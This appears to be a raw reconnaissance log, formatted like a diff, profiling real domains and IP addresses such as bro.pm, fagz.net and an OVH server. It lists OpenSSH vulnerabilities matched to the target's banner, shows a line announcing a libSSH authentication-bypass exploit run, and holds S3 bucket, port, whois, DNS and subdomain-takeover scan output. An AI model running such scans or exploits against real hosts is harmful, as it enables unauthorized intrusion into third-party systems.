+| [75248] OpenSSH sftp.c process_put Function Glob Expression Parsing Remote DoS
+| [72183] Portable OpenSSH ssh-keysign ssh-rand-helper Utility File Descriptor Leak Local Information Disclosure
+| [70873] OpenSSH Legacy Certificates Stack Memory Disclosure
+| [69658] OpenSSH J-PAKE Public Parameter Validation Shared Secret Authentication Bypass
+| [67743] Novell NetWare OpenSSH SSHD.NLM Absolute Path Handling Remote Overflow
+| [59353] OpenSSH sshd Local TCP Redirection Connection Masking Weakness
+| [58495] OpenSSH sshd ChrootDirectory Feature SetUID Hard Link Local Privilege Escalation
+| [56921] OpenSSH Unspecified Remote Compromise
+| [53021] OpenSSH on ftp.openbsd.org Trojaned Distribution
+| [50036] OpenSSH CBC Mode Chosen Ciphertext 32-bit Chunk Plaintext Context Disclosure
+| [49386] OpenSSH sshd TCP Connection State Remote Account Enumeration
+| [48791] OpenSSH on Debian sshd Crafted Username Arbitrary Remote SELinux Role Access
+| [47635] OpenSSH Packages on Red Hat Enterprise Linux Compromised Distribution
+| [47227] OpenSSH X11UseLocalhost X11 Forwarding Port Hijacking
+| [45873] Cisco WebNS SSHield w/ OpenSSH Crafted Large Packet Remote DoS
+| [43911] OpenSSH ~/.ssh/rc ForceCommand Bypass Arbitrary Command Execution
+| [43745] OpenSSH X11 Forwarding Local Session Hijacking
+| [43371] OpenSSH Trusted X11 Cookie Connection Policy Bypass
+| [39214] OpenSSH linux_audit_record_event Crafted Username Audit Log Injection
+| [37315] pam_usb OpenSSH Authentication Unspecified Issue
+| [34850] OpenSSH on Mac OS X Key Generation Remote Connection DoS
+| [34601] OPIE w/ OpenSSH Account Enumeration
+| [34600] OpenSSH S/KEY Authentication Account Enumeration
+| [32721] OpenSSH Username Password Complexity Account Enumeration
+| [30232] OpenSSH Privilege Separation Monitor Weakness
+| [29494] OpenSSH packet.c Invalid Protocol Sequence Remote DoS
+| [29266] OpenSSH GSSAPI Authentication Abort Username Enumeration
+| [29264] OpenSSH Signal Handler Pre-authentication Race Condition Code Execution
+| [29152] OpenSSH Identical Block Packet DoS
+| [27745] Apple Mac OS X OpenSSH Nonexistent Account Login Enumeration DoS
+| [23797] OpenSSH with OpenPAM Connection Saturation Forked Process Saturation DoS
+| [22692] OpenSSH scp Command Line Filename Processing Command Injection
+| [20216] OpenSSH with KerberosV Remote Authentication Bypass
+| [19142] OpenSSH Multiple X11 Channel Forwarding Leaks
+| [19141] OpenSSH GSSAPIAuthentication Credential Escalation
+| [18236] OpenSSH no pty Command Execution Local PAM Restriction Bypass
+| [16567] OpenSSH Privilege Separation LoginGraceTime DoS
+| [16039] Solaris 108994 Series Patch OpenSSH LDAP Client Authentication DoS
+| [9562] OpenSSH Default Configuration Anon SSH Service Port Bounce Weakness
+| [9550] OpenSSH scp Traversal Arbitrary File Overwrite
+| [6601] OpenSSH *realloc() Unspecified Memory Errors
+| [6245] OpenSSH SKEY/BSD_AUTH Challenge-Response Remote Overflow
+| [6073] OpenSSH on FreeBSD libutil Arbitrary File Read
+| [6072] OpenSSH PAM Conversation Function Stack Modification
+| [6071] OpenSSH SSHv1 PAM Challenge-Response Authentication Privilege Escalation
+| [5536] OpenSSH sftp-server Restricted Keypair Restriction Bypass
+| [5408] OpenSSH echo simulation Information Disclosure
+| [5113] OpenSSH NIS YP Netgroups Authentication Bypass
+| [4536] OpenSSH Portable AIX linker Privilege Escalation
+| [3938] OpenSSL and OpenSSH /dev/random Check Failure
+| [3456] OpenSSH buffer_append_space() Heap Corruption
+| [2557] OpenSSH Multiple Buffer Management Multiple Overflows
+| [2140] OpenSSH w/ PAM Username Validity Timing Attack
+| [2112] OpenSSH Reverse DNS Lookup Bypass
+| [2109] OpenSSH sshd Root Login Timing Side-Channel Weakness
+| [1853] OpenSSH Symbolic Link 'cookies' File Removal
+| [839] OpenSSH PAMAuthenticationViaKbdInt Challenge-Response Remote Overflow
+| [781] OpenSSH Kerberos TGT/AFS Token Passing Remote Overflow
+| [730] OpenSSH Channel Code Off by One Remote Privilege Escalation
+| [688] OpenSSH UseLogin Environment Variable Local Command Execution
+| [642] OpenSSH Multiple Key Type ACL Bypass
+| [504] OpenSSH SSHv2 Public Key Authentication Bypass
+| [341] OpenSSH UseLogin Local Privilege Escalation
+
+SSH: SSH-2.0-OpenSSH_6.6.1 	142.44.163.110
+stop.packeting.me	OVH
+Canada
+[Not Vulnerable] .bro.pm
+[Not Vulnerable] *.bro.pm
+[Not Vulnerable] irc.bro.pm
+[Not Vulnerable] domain
+[Not Vulnerable] bro.pm
+[Not Vulnerable] imap.bro.pm
+[Not Vulnerable] smtp.bro.pm
+[Not Vulnerable] pop.bro.pm
+[Not Vulnerable] webmail.bro.pm
+[Not Vulnerable] www.bro.pm
+
+
+ RUNNING LIBSSH AUTH BYPASS EXPLOIT CVE-2018-10933
+====================================================================================
+ STARTING PUBLIC S3 BUCKET SCAN
+====================================================================================
+INFO[0000] Starting to process queue....
+INFO[0000] Starting to process permutations....
+INFO[0000] FORBIDDEN http://bro.s3.amazonaws.com (http://bro.pm)
+INFO[0000] FORBIDDEN http://bro-backup.s3.amazonaws.com (http://bro.pm)
+INFO[0000] FORBIDDEN http://bro-tools.s3.amazonaws.com (http://bro.pm)
+INFO[0000] FORBIDDEN http://bro-media.s3.amazonaws.com (http://bro.pm)
+INFO[0000] FORBIDDEN http://bro-bucket.s3.amazonaws.com (http://bro.pm)
+INFO[0000] FORBIDDEN http://bucket-bro.s3.amazonaws.com (http://bro.pm)
+INFO[0000] FORBIDDEN http://bro-data.s3.amazonaws.com (http://bro.pm)
+INFO[0000] FORBIDDEN http://bro-dev.s3.amazonaws.com (http://bro.pm)
+INFO[0000] FORBIDDEN http://bro-test.s3.amazonaws.com (http://bro.pm)
+
+TXT Records ** Find more hosts in Sender Policy Framework (SPF) configurations
+"v=spf1 include:_mailcust.gandi.net ?all"
+
+Ncat: Connected to 142.44.163.110:9999.
+http://irc.did911.com/g5vsg8ee
+
+Ncat: 1 bytes sent, 32 bytes received in 0.10 seconds.
+rDNS record for 139.180.221.194: 139.180.221.194.vultr.com
+http://142.44.163.110:80 [403 Forbidden] Country[CANADA][CA], HTTPServer[nginx/1.12.2], IP[142.44.163.110], Title[403 Forbidden], nginx[1.12.2]
+Ncat: Connected to 139.99.157.254:6900.
+
+ trump.did911.com (139.99.157.254)
+6661/tcp open  unknown syn-ack ttl 48
+
+PORT     STATE         SERVICE
+53/udp   open|filtered domain
+67/udp   open|filtered dhcps
+68/udp   open|filtered dhcpc
+69/udp   open|filtered tftp
+88/udp   open|filtered kerberos-sec
+123/udp  open|filtered ntp
+137/udp  open|filtered netbios-ns
+138/udp  open|filtered netbios-dgm
+139/udp  open|filtered netbios-ssn
+161/udp  open|filtered snmp
+162/udp  open|filtered snmptrap
+389/udp  open|filtered ldap
+500/udp  open|filtered isakmp
+520/udp  open|filtered route
+2049/udp open|filtered nfs
+
+Nmap done: 1 IP address (1 host up) scanned in 14.32 seconds
+
+
+domain:      bro.pm
+status:      ACTIVE
+hold:        NO
+holder-c:    ANO00-FRNIC
+admin-c:     ANO00-FRNIC
+tech-c:      GR283-FRNIC
+zone-c:      NFC1-FRNIC
+nsl-id:      NSL57730-FRNIC
+registrar:   GANDI
+Expiry Date: 2020-09-20T14:20:31Z
+created:     2017-09-20T14:20:31Z
+last-update: 2019-09-04T09:58:42Z
+source:      FRNIC
+
+ns-list:     NSL57730-FRNIC
+nserver:     liv.ns.cloudflare.com
+nserver:     tim.ns.cloudflare.com
+source:      FRNIC
+
+registrar:   GANDI
+type:        Isp Option 1
+address:     63-65 boulevard Massena
+address:     75013 PARIS
+country:     FR
+phone:       +33 1 70 37 76 61
+fax-no:      +33 1 43 73 18 51
+e-mail:      support@support.gandi.net
+website:     https://www.gandi.net/fr/tlds/fr/
+anonymous:   NO
+registered:  2004-03-09T12:00:00Z
+source:      FRNIC
+
+nic-hdl:     ANO00-FRNIC
+type:        PERSON
+contact:     Ano Nymous
+remarks:     -------------- WARNING --------------
+remarks:     While the registrar knows him/her,
+remarks:     this person chose to restrict access
+remarks:     to his/her personal data. So PLEASE,
+remarks:     don't send emails to Ano Nymous. This
+remarks:     address is bogus and there is no hope
+remarks:     of a reply.
+remarks:     -------------- WARNING --------------
+registrar:   GANDI
+changed:     2017-09-20T14:20:30Z anonymous@anonymous
+anonymous:   YES
+obsoleted:   NO
+eligstatus:  ok
+eligdate:    2017-09-20T14:20:30Z
+reachstatus: not identified
+source:      FRNIC
+
+nic-hdl:     ANO00-FRNIC
+type:        PERSON
+contact:     Ano Nymous
+remarks:     -------------- WARNING --------------
+remarks:     While the registrar knows him/her,
+remarks:     this person chose to restrict access
+remarks:     to his/her personal data. So PLEASE,
+remarks:     don't send emails to Ano Nymous. This
+remarks:     address is bogus and there is no hope
+remarks:     of a reply.
+remarks:     -------------- WARNING --------------
+registrar:   GANDI
+changed:     2017-09-20T14:20:30Z anonymous@anonymous
+anonymous:   YES
+obsoleted:   NO
+eligstatus:  ok
+eligdate:    2017-09-20T14:20:30Z
+reachstatus: not identified
+source:      FRNIC
+
+nic-hdl:     GR283-FRNIC
+type:        ROLE
+contact:     GANDI ROLE
+address:     Gandi
+address:     15, place de la Nation
+address:     75011 Paris
+country:     FR
+e-mail:      noc@gandi.net
+trouble:     -------------------------------------------------
+trouble:     GANDI is an ICANN accredited registrar
+trouble:     for more information:
+trouble:     Web:   http://www.gandi.net
+trouble:     -------------------------------------------------
+trouble:     - network troubles: noc@gandi.net
+trouble:     - SPAM:             abuse@support.gandi.net
+trouble:     -------------------------------------------------
+admin-c:     NL346-FRNIC
+tech-c:      NL346-FRNIC
+tech-c:      TUF1-FRNIC
+notify:      noc@gandi.net
+registrar:   GANDI
+changed:     2006-03-03T14:39:12Z noc@gandi.net
+anonymous:   NO
+obsoleted:   NO
+eligstatus:  not identified
+reachstatus: not identified
+source:      FRNIC
+1	www.bro.pm	‐
+GANDI SAS
+	‐
+2	irc.bro.pm	‐
+OVH SAS
+	‐
+3	bro.pm	‐
+DigitalOcean, LLC
+
+GANDI SAS
+
+
+
+
+#	Domain	Alexa Rank	Hosting Provider	Mail Provider
+1	fagz.net	‐
+Rackspace Hosting
+	‐
+2	www.fagz.net	‐
+Rackspace Hosting 67.23.0.195
+	‐
+3	irc.fagz.net	‐
+
+    FranTech Solutions
+    OVH SAS
+
+	‐
+
+79.137.37.33
+209.141.53.110
+192.99.55.197
+164.132.228.206
+158.69.197.147
+149.56.12.202
+139.99.157.254
+Domain	Alexa Rank	Hosting Provider	Mail Provider
+1	irc.fagz.net	‐
+
+  FranTech Solutions
+  OVH SAS
+
+‐
+2	serious.fuckin.business	‐
+
+  FranTech Solutions
+  OVH SAS
+
+‐
+3	irc.j3ws.org	‐
+
+  FranTech Solutions
+  OVH SAS
+
+‐
+4	chat.mirccloud.com	‐
+
+  FranTech Solutions
+  OVH SAS
+
+‐
+5	irc.myg0t.cc	‐
+
+  FranTech Solutions
+  OVH SAS
+
+‐
+6	git.spiderbyte.io	‐
+OVH SAS
+‐
+7	i.spiderbyte.io	‐
+OVH SAS
+‐
+8	irc.spiderbyte.io	‐
+OVH SAS
+‐
+9	spiderbyte.io	‐
+OVH SAS
+
+ZOHO
+10	irc.supernets.org	‐
+
+  FranTech Solutions
+  OVH SAS
+
+‐
+OVH SAS
+FranTech Solutions
+	2019-08-22 (2 months ago)	2019-10-30 (17 hours ago)	2 months
+79.137.37.33
+192.99.55.197
+164.132.228.206
+158.69.197.147
+149.56.12.202
+139.99.157.254
+
+OVH SAS
+	2019-08-13 (2 months ago)	2019-08-22 (2 months ago)	9 days
+79.137.37.33
+192.99.55.197
+158.69.197.147
+149.56.12.202
+139.99.157.254
+
+OVH SAS
+	2019-08-10 (2 months ago)	2019-08-13 (2 months ago)	3 days
+
+104.194.206.136
+  xmpp.ddos.rocks	‐
+Spartan Host Ltd
+‐
+2	300gbit.ddos.rocks	‐
+OVH SAS
+‐
+3	ddos.rocks	‐	‐
+
+  Computerline GmbH
+  ZOHO
+
+  	 - fagz.net
+  	 - irc.fagz.net
+  	 - www.fagz.net
+
+      ⍥  Total 				[3]
+
+  [+] Probe subdomain for working on http/https
+  ---------------------------------------------
+
+  	 - http://www.fagz.net
+  	 - http://fagz.net
+  	 - http://irc.fagz.net
+
+      ⍥  Total 				[3]
+
+
+  [+] Check Live Host: Ping Sweep - ICMP PING
+  ---------------------------------------------
+
+      ⍥  [DEAD]	 fagz.net
+      ⍥  [DEAD]	 irc.fagz.net
+      ⍥  [DEAD]	 www.fagz.net
+
+  [+] Check Resolving: Subdomains & Domains
+  ---------------------------------------------
+
+      ⍥  Resolving domains to: 67.23.0.195
+      ⍥  Resolving domains to: 192.99.55.197
+      ⍥  Resolving domains to: 67.23.0.195
+
+  [+] Subdomain TakeOver - Check Possible Vulns
+  ---------------------------------------------
+
+      ⍥  [FAILS]	 En: Unknown  http://www.fagz.net
+      ⍥  [FAILS]	 En: Unknown  http://fagz.net
+      ⍥  [FAILS]	 En: Unknown  http://irc.fagz.net
+
+  [+]  Checks status code on port 80 and 443
+  ---------------------------------------------
+
+      ⍥  [200]	 http://www.fagz.net
+      ⍥  [200]	 http://fagz.net
+      ⍥  [200]	 http://irc.fagz.net
+
+  [+] Web Screenshots: from domain list
+  ---------------------------------------------
+
+   [+] Site :> cwproductions.net
+   [+] Site :> discorporated.net
+   [+] Site :> fagz.net
+   [+] Site :> fredbob.net
+   [+] Site :> mta-sts.mx.cwproductions.net
+   [+] Site :> mx.cwproductions.net
+   [+] Site :> www.cwproductions.net
+   Address       = 67.23.0.195
+   Network       = 67.23.0.195 / 32
+   Netmask       = 255.255.255.255
+   Broadcast     = not needed on Point-to-Point links
+   Wildcard Mask = 0.0.0.0
+   Hosts Bits    = 0
+   Max. Hosts    = 1   (2^0 - 0)
+   Host Range    = { 67.23.0.195 - 67.23.0.195 }
+
+   [+] IP Address : 67.23.0.195
+   [+] Country : United States
+   [+] State : Texas
+   [+] City : San Antonio
+   [+] Latitude : 29.4963
+   [+] Longitude : -98.4004
+
+   [!] Module Completed --> GeoIP
+
+   [*] Firing up module --> DNS Enumeration
+
+     =====================
+      D N S   L 0 0 K U P
+     =====================
+
+
+   [+] DNS Records
+  dns2.stabletransit.com. (65.61.188.4) RACKSPACE-LONUnited States United States
+  dns1.stabletransit.com. (69.20.95.4) RACKSPACE - Rackspace Hosting United States
+
+   [+] Host Records (A)
